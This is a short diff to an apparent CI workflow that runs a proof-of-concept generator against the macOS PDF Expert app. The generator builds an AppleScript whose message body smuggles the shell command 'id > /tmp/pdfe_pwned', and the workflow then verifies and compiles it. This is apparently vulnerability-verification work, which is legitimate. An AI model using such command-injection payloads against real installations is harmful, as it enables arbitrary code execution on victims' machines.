@@ -29,7 +29,7 @@ jobs:
           set -euo pipefail
           python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
             --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
-          echo "--- line 10 ---"; sed -n '10p' generated.scpt
+          echo "--- record line ---"; grep -n 'new outgoing message' generated.scpt
           echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
           echo "--- compile ---"
           osacompile -o /tmp/gen.scptd generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"
